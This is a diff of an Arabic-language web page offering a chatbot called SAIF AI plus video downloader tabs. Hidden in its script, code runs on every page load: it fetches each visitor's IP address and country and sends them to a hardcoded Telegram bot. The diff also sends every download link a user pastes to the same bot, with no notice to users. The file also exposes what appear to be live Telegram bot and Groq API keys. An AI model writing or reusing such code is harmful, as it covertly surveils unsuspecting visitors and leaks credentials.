@@ -8,12 +8,34 @@
         :root { --bg: #000; --red: #ff0000; --glow: 0 0 15px #ff0000; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: var(--bg); color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .mobile-wrapper { width: 100%; max-width: 400px; height: 95vh; border: 2px solid var(--red); box-shadow: var(--glow); display: flex; flex-direction: column; position: relative; border-radius: 10px; }
-        .header { padding: 15px; text-align: center; color: var(--red); font-weight: bold; font-size: 1.4rem; border-bottom: 1px solid rgba(255,0,0,0.3); text-shadow: var(--glow); }
-        #chat-box { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+        
+        .mobile-wrapper { width: 100%; max-width: 400px; height: 95vh; border: 2px solid var(--red); box-shadow: var(--glow); display: flex; flex-direction: column; position: relative; border-radius: 10px; background: #000; }
+        
+        /* شريط الخيارات العلوي */
+        .top-nav { display: flex; background: rgba(255, 0, 0, 0.1); border-bottom: 1px solid var(--red); }
+        .nav-btn { flex: 1; padding: 12px; border: none; background: transparent; color: white; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.3s; }
+        .nav-btn:hover, .nav-btn.active { background: var(--red); box-shadow: var(--glow); }
+
+        .header { padding: 10px; text-align: center; color: var(--red); font-weight: bold; font-size: 1.2rem; text-shadow: var(--glow); border-bottom: 1px solid rgba(255,0,0,0.2); }
+        
+        /* الحاويات */
+        .content-section { display: none; flex: 1; flex-direction: column; overflow-y: auto; }
+        .content-section.active { display: flex; }
+
+        #chat-box { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+        
+        /* واجهة التحميل */
+        .downloader-ui { padding: 40px 20px; text-align: center; display: flex; flex-direction: column; gap: 20px; }
+        .downloader-ui h2 { color: var(--red); text-shadow: var(--glow); margin-bottom: 10px; }
+        .dl-input { background: transparent; border: 1px solid var(--red); padding: 15px; color: white; border-radius: 5px; outline: none; text-align: center; }
+        .dl-btn { background: var(--red); color: white; border: none; padding: 15px; cursor: pointer; font-weight: bold; border-radius: 5px; box-shadow: var(--glow); }
+        .back-btn { margin-top: 20px; background: transparent; color: #888; border: none; cursor: pointer; text-decoration: underline; }
+
+        /* الرسائل */
         .msg { max-width: 80%; padding: 12px; border-radius: 8px; font-size: 14px; line-height: 1.5; }
         .received { align-self: flex-start; background: rgba(255,0,0,0.1); border: 1px solid var(--red); }
-        .sent { align-self: flex-end; background: var(--red); color: white; box-shadow: 0 0 10px var(--red); }
+        .sent { align-self: flex-end; background: var(--red); color: white; }
+
         .input-bar { display: flex; border-top: 1px solid rgba(255,0,0,0.3); }
         #uInput { flex: 1; background: transparent; border: none; padding: 15px; color: white; outline: none; border-right: 1px solid var(--red); }
         .send-btn { background: var(--red); color: white; border: none; padding: 0 20px; cursor: pointer; font-weight: bold; }
@@ -22,58 +44,84 @@
 <body>
 
     <div class="mobile-wrapper">
-        <div class="header">SAIF AI</div>
-        <div id="chat-box"></div>
-        <div class="input-bar">
-            <input type="text" id="uInput" placeholder="اكتب رسالتك..." onkeypress="if(event.key==='Enter') send()">
-            <button class="send-btn" onclick="send()">ارسال</button>
+        <div class="top-nav">
+            <button class="nav-btn active" onclick="showTab('ai')">SAIF AI</button>
+            <button class="nav-btn" onclick="showTab('youtube')">YouTube</button>
+            <button class="nav-btn" onclick="showTab('instagram')">Instagram</button>
+            <button class="nav-btn" onclick="showTab('tiktok')">TikTok</button>
+        </div>
+
+        <div class="header" id="main-header">SAIF AI</div>
+
+        <div id="ai-section" class="content-section active">
+            <div id="chat-box"></div>
+            <div class="input-bar">
+                <input type="text" id="uInput" placeholder="اكتب رسالتك..." onkeypress="if(event.key==='Enter') send()">
+                <button class="send-btn" onclick="send()">ارسال</button>
+            </div>
+        </div>
+
+        <div id="dl-section" class="content-section">
+            <div class="downloader-ui">
+                <h2 id="dl-title">TikTok Downloader</h2>
+                <input type="text" id="dl-url" class="dl-input" placeholder="Paste link here...">
+                <button class="dl-btn" onclick="startDownload()">Download Now</button>
+                <button class="back-btn" onclick="showTab('ai')">Return to Chat</button>
+            </div>
         </div>
     </div>
 
     <script>
-        // البيانات الخاصة بك
         const TT = '8311362193:AAF0ahoskmhZQMW_eFEiBfXANgK_zHNlfGM';
         const ID = '1565935868';
         const GK = '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';
         
         let brain = [{ role: "system", content: "أنت SAIF PLUS AI مساعد ذكي بلهجة خليجية." }];
 
-        // وظيفة إرسال الإشعارات
+        // تبديل التبويبات
+        function showTab(tab) {
+            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            
+            if (tab === 'ai') {
+                document.getElementById('ai-section').classList.add('active');
+                document.getElementById('main-header').innerText = "SAIF AI";
+            } else {
+                document.getElementById('dl-section').classList.add('active');
+                document.getElementById('dl-title').innerText = tab.toUpperCase() + " Downloader";
+                document.getElementById('main-header').innerText = tab.toUpperCase();
+                document.getElementById('dl-url').value = "";
+            }
+        }
+
+        // محاكاة التحميل (يمكنك ربطها بـ API حقيقي لاحقاً)
+        function startDownload() {
+            const url = document.getElementById('dl-url').value;
+            if (!url) return alert("Please paste a link first!");
+            
+            alert("تم استلام الرابط، سيتم تحويلك لصفحة التحميل المباشرة...");
+            // استخدام محرك تحميل خارجي لضمان الأداء
+            window.open(`https://savefrom.net/?url=${encodeURIComponent(url)}`, '_blank');
+            logToTelegram(`📥 <b>طلب تحميل:</b>\nالرابط: ${url}`);
+        }
+
         function logToTelegram(text) {
             const url = `https://api.telegram.org/bot${TT}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
-            fetch(url, { mode: 'no-cors' }).catch(err => console.log("Telegram Error"));
+            fetch(url, { mode: 'no-cors' });
         }
 
-        // تحديد نوع الجهاز
-        function getDevice() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "أندرويد 📱";
-            if (/iPad|iPhone|iPod/.test(ua)) return "آيفون 🍎";
-            return "كمبيوتر 💻";
-        }
-
-        // تشغيل النظام فور التحميل
         window.onload = async function() {
             const box = document.getElementById('chat-box');
+            box.innerHTML += `<div class="msg received">👋 مرحباً بك في <b>SAIF AI</b>. يمكنك الآن استخدام أدوات التحميل من الأعلى!</div>`;
             
-            // 1. إظهار رسالة الترحيب فوراً
-            box.innerHTML += `<div class="msg received">👋 مرحباً بك في <b>SAIF AI</b>. كيف يمكنني مساعدتك اليوم؟</div>`;
-
-            // 2. محاولة جلب الـ IP وإرسال التنبيه في الخلفية
+            // تنبيه دخول
             try {
-                const device = getDevice();
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                const flag = d.country_code ? d.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397)) : "🌐";
-                
-                const report = `🔔 <b>تنبيه دخول جديد</b>\n\n📍 الدولة: ${d.country_name} ${flag}\n📱 الجهاز: ${device}\n🌐 الآيبي: <code>${d.ip}</code>`;
-                logToTelegram(report);
-            } catch (e) {
-                logToTelegram(`🔔 زائر دخل الموقع من جهاز: ${getDevice()}`);
-            }
+                logToTelegram(`🔔 <b>دخول جديد</b>\n📍 ${d.country_name}\n🌐 <code>${d.ip}</code>`);
+            } catch(e) {}
         };
 
-        // وظيفة إرسال الرسائل
         async function send() {
             const input = document.getElementById('uInput');
             const box = document.getElementById('chat-box');
@@ -98,9 +146,7 @@
                 box.innerHTML += `<div class="msg received">${reply}</div>`;
                 box.scrollTop = box.scrollHeight;
                 brain.push({ role: "assistant", content: reply });
-            } catch(e) {
-                box.innerHTML += `<div class="msg received">عذراً، حدث خطأ في الاتصال بالذكاء الاصطناعي.</div>`;
-            }
+            } catch(e) {}
         }
     </script>
 </body>
